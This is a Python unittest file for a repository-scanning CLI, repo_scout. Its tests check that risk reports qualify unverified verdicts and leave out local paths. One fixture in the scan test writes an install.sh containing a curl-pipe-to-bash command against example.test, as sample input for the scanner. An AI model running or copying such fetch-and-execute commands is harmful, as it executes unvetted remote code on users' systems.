import contextlib
import io
import re
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from repo_scout.cache import FileCache
from repo_scout.cli import (
    _local_repo_summary,
    build_parser,
    run_download_command,
    run_inspect_command,
    run_scan_command,
    run_search_command,
)
from repo_scout.models import FileFetch, RepoSummary


NUMERIC_RISK = re.compile(r"(?i)risk:?(\*\*)? \d+/100")


class StubClient:
    """A client that answers, so the command runs its normal path.

    Every file lookup answers `unknown`, which is what a rate-limited or offline
    lookup returns, so the report this produces is the one C2 was reported
    against: nothing established, and no file ever opened.
    """

    def __init__(self, repo, results=1):
        self._repo = repo
        self._results = results

    def get_repo(self, full_name):
        return self._repo

    def search_repositories(self, query, limit=10):
        return [self._repo] * min(self._results, limit)

    def fetch_text_file(self, full_name, path, branch="main"):
        return FileFetch("unknown")


def stub_repo():
    return RepoSummary(
        full_name="owner/repo",
        description="A sample repository",
        url="https://github.com/owner/repo",
    )


class CliTests(unittest.TestCase):
    def test_parser_accepts_search_command(self):
        args = build_parser().parse_args(["search", "ai agents"])

        self.assertEqual(args.command, "search")
        self.assertEqual(args.query, "ai agents")

    def test_scan_command_writes_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# AI Agent")
            (repo / "install.sh").write_text("curl https://example.test/x | bash")
            reports = root / "reports"

            code = run_scan_command(repo, reports)

            self.assertEqual(code, 0)
            self.assertTrue(any(reports.glob("*.md")))
            self.assertTrue(any(reports.glob("*.html")))

    def test_scan_report_records_the_directory_name_and_not_its_location(self):
        # A report is written to be handed to a colleague or attached to a
        # ticket. The absolute path of the scanned directory contains the
        # reader's home directory and account name, and often their employer's
        # project layout, so neither output file may contain it. The
        # directory's own name is what identifies the scan.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# AI Agent")
            reports = root / "reports"

            run_scan_command(repo, reports)

            for written in sorted(reports.iterdir()):
                with self.subTest(report=written.name):
                    text = written.read_text(encoding="utf-8")
                    self.assertNotIn(str(repo), text)
                    self.assertNotIn(str(repo.resolve()), text)
                    self.assertIn("Repo Scout Report: repo", text)

    def test_inspect_never_reports_an_absence_of_static_findings(self):
        # `inspect` reads published metadata and opens no file, so its findings
        # list is empty because nothing was examined. Every surface it writes to
        # has to say that rather than report a clean scan.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            terminal = io.StringIO()
            with contextlib.redirect_stdout(terminal):
                code = run_inspect_command(
                    "owner/repo", StubClient(stub_repo()), root / "reports", FileCache(root / "cache")
                )

            self.assertEqual(code, 0)
            written = sorted((root / "reports").iterdir())
            self.assertTrue(written)
            for artifact in written + [root / "terminal"]:
                text = terminal.getvalue() if artifact.name == "terminal" else artifact.read_text(encoding="utf-8")
                with self.subTest(surface=artifact.name):
                    self.assertNotIn("No static risk findings", text)
                    self.assertIsNone(NUMERIC_RISK.search(text))

    def test_scan_reports_a_clean_scan_as_a_finding_of_none(self):
        # The opposite case: a scan did run, so an empty findings list is an
        # observation and the risk figure is a real number.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# Sample project")
            reports = root / "reports"
            terminal = io.StringIO()

            with contextlib.redirect_stdout(terminal):
                run_scan_command(repo, reports)

            for artifact in sorted(reports.iterdir()):
                text = artifact.read_text(encoding="utf-8")
                with self.subTest(surface=artifact.name):
                    self.assertIn("No static risk findings", text)
            self.assertIsNotNone(NUMERIC_RISK.search(terminal.getvalue()))

    def test_search_does_not_print_a_risk_number_for_an_unscanned_repository(self):
        terminal = io.StringIO()
        with contextlib.redirect_stdout(terminal):
            code = run_search_command("sample", 1, StubClient(stub_repo()))

        self.assertEqual(code, 0)
        self.assertIsNone(NUMERIC_RISK.search(terminal.getvalue()))

    def test_a_fully_signalled_local_repository_is_never_avoided(self):
        # The regression this file exists to prevent. A directory carrying every
        # signal a local scan can observe -- README, LICENSE, package metadata,
        # tests and CI -- and producing no static findings must not be labelled
        # AVOID. It was, and so was every other directory: relevance needs a
        # query and credibility needs repository metadata, so the reachable
        # local total sat under the AVOID threshold and no input could produce
        # another verdict. AVOID is an active negative claim, and it was being
        # made at full confidence exactly where the scale, not the repository,
        # was the limit.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            (repo / "tests").mkdir(parents=True)
            (repo / ".github" / "workflows").mkdir(parents=True)
            (repo / "README.md").write_text("# Sample project")
            (repo / "LICENSE").write_text("MIT")
            (repo / "pyproject.toml").write_text("[project]\nname = \"sample\"\n")
            (repo / "tests" / "test_sample.py").write_text("import unittest\n")
            (repo / ".github" / "workflows" / "ci.yml").write_text("on: push\n")
            reports = root / "reports"
            terminal = io.StringIO()

            with contextlib.redirect_stdout(terminal):
                code = run_scan_command(repo, reports)

            self.assertEqual(code, 0)
            written = sorted(reports.iterdir())
            self.assertEqual(len(written), 2)
            for artifact in written + [root / "terminal"]:
                text = terminal.getvalue() if artifact.name == "terminal" else artifact.read_text(encoding="utf-8")
                with self.subTest(surface=artifact.name):
                    self.assertNotIn("AVOID", text)
                    self.assertIn("not established", text)

    def test_a_withheld_verdict_explains_itself_in_every_artifact(self):
        # The qualification has to travel with the number. A report file is
        # written to be shared and the README does not go with it, so a reader
        # holding only `owner__repo.html` has to be told why no label is there.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# Sample project")
            (repo / "pyproject.toml").write_text("[project]\nname = \"sample\"\n")
            (repo / "LICENSE").write_text("MIT")
            reports = root / "reports"
            terminal = io.StringIO()

            with contextlib.redirect_stdout(terminal):
                run_scan_command(repo, reports)

            for artifact in sorted(reports.iterdir()) + [root / "terminal"]:
                text = terminal.getvalue() if artifact.name == "terminal" else artifact.read_text(encoding="utf-8")
                with self.subTest(surface=artifact.name):
                    self.assertIn("not established", text)
                    self.assertIn("no query", text)
                    self.assertIn("metadata", text)

    def test_search_does_not_label_a_repository_it_gathered_no_evidence_about(self):
        # `search` opens no file and fetches no signal, so every signal it scores
        # is unknown. A label printed there is a claim about a repository the
        # command did not examine.
        terminal = io.StringIO()
        with contextlib.redirect_stdout(terminal):
            run_search_command("sample", 1, StubClient(stub_repo()))

        output = terminal.getvalue()
        self.assertNotIn("AVOID", output)
        self.assertIn("not established", output)

    def test_search_prints_the_usefulness_ceiling_not_a_bare_number(self):
        # `search` passes `RepoSignals()` unconditionally, so every signal it
        # scores is unknown and its confirmed figure understates by more than any
        # other command's. A bare "useful 48/100" reads as a measurement of the
        # repository rather than of what was established about it, and it is the
        # one surface that dropped the ceiling the other three print.
        terminal = io.StringIO()
        with contextlib.redirect_stdout(terminal):
            run_search_command("sample", 1, StubClient(stub_repo()))

        output = terminal.getvalue()
        self.assertIn("confirmed, up to", output)
        self.assertNotIn("Matches query terms", output)

    def test_search_states_the_invariant_risk_and_verdict_once(self):
        # `search` builds a fresh empty `RepoSignals` for every result and runs
        # no static scan, so the Risk and Verdict lines come out byte-identical
        # on every row. Repeated down the page they are two thirds of the
        # listing, and they bury the usefulness figure, which is the only part
        # that varies. State them once, above the listing.
        #
        # The listing does not assume they are identical, it checks: the header
        # appears only when every row really did produce the same pair, and
        # otherwise each row carries its own. So this asserts the outcome for a
        # real multi-result listing rather than the reasoning behind it.
        terminal = io.StringIO()
        with contextlib.redirect_stdout(terminal):
            code = run_search_command("sample", 3, StubClient(stub_repo(), results=3))

        output = terminal.getvalue()

        self.assertEqual(code, 0)
        self.assertEqual(output.count("Usefulness:"), 3)
        self.assertEqual(output.count("Risk:"), 1)
        self.assertEqual(output.count("Verdict:"), 1)
        self.assertEqual(output.count("not established"), 1)

    def test_terminal_summary_and_help_carry_the_same_limitation(self):
        # The scores travel to three places: two report files, the terminal, and
        # `--help` for someone deciding whether to run the tool at all. All of
        # them state the limitation, so none of them reads as a safety verdict.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# Sample project")
            terminal = io.StringIO()

            with contextlib.redirect_stdout(terminal):
                run_scan_command(repo, root / "reports")

            self.assertIn("does not prove", terminal.getvalue())

        description = build_parser().description or ""
        self.assertIn("does not prove", description)

    def test_help_qualifies_quarantine_and_does_not_misdescribe_report(self):
        # `--help` is read on its own. "quarantine" unqualified is a containment
        # claim the tool cannot support, and only the README said what it really
        # means. `report` claimed to be the command that writes report files;
        # `scan` writes the identical files through the identical code path.
        rendered = " ".join(build_parser().format_help().split())

        self.assertIn("not sandboxed", rendered)
        self.assertNotIn("Alias for scan that writes report files", rendered)
        self.assertIn("same as scan", rendered.lower())

    def test_download_success_message_qualifies_quarantine(self):
        with tempfile.TemporaryDirectory() as tmp, \
             patch("repo_scout.cli.shutil.which", return_value="/usr/bin/git"), \
             patch("repo_scout.cli.subprocess.run"):
            terminal = io.StringIO()
            with contextlib.redirect_stdout(terminal):
                code = run_download_command("owner/repo", Path(tmp))

        self.assertEqual(code, 0)
        self.assertIn("not sandboxed", terminal.getvalue())

    def test_no_command_without_a_query_claims_a_query_match(self):
        # `run_scan_command` used to pass the scanned directory's name as the
        # query and `run_inspect_command` the repository's own name, so each
        # matched a name against itself and opened its Evidence section with a
        # match that was never observed.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            repo = root / "repo"
            repo.mkdir()
            (repo / "README.md").write_text("# Sample project")

            with contextlib.redirect_stdout(io.StringIO()):
                run_scan_command(repo, root / "scan-reports")
                run_inspect_command(
                    "owner/repo",
                    StubClient(stub_repo()),
                    root / "inspect-reports",
                    FileCache(root / "cache"),
                )

            written = sorted((root / "scan-reports").iterdir()) + sorted((root / "inspect-reports").iterdir())
            self.assertEqual(len(written), 4)
            for artifact in written:
                with self.subTest(artifact=artifact.name):
                    self.assertNotIn("Matches query terms", artifact.read_text(encoding="utf-8"))

    def test_local_summary_names_the_directory_and_carries_no_url(self):
        # `..` is the blunt case: the name has to come from the directory the
        # path points at, and a local directory has no published URL to record.
        with tempfile.TemporaryDirectory() as tmp:
            inner = Path(tmp) / "repo" / "inner"
            inner.mkdir(parents=True)

            summary = _local_repo_summary(inner / "..")

            self.assertEqual(summary.full_name, "repo")
            self.assertEqual(summary.url, "")


if __name__ == "__main__":
    unittest.main()
